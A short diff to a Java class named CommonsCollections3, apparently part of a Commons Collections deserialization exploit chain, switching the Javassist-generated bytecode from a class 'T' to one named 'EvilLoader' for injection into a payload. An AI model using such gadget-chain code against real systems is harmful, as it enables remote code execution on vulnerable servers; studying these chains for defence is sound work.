@@ -47,8 +47,12 @@ public class CommonsCollections3 {
 //        byte[] bytes = byteArrayOutputStream.toByteArray();
 //        return bytes;
 
+//        ClassPool pool = ClassPool.getDefault();
+//        CtClass clazz = pool.get(T.class.getName());
+//        return clazz.toBytecode();
+
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(T.class.getName());
+        CtClass clazz = pool.get(EvilLoader.class.getName());
         return clazz.toBytecode();
 
     }
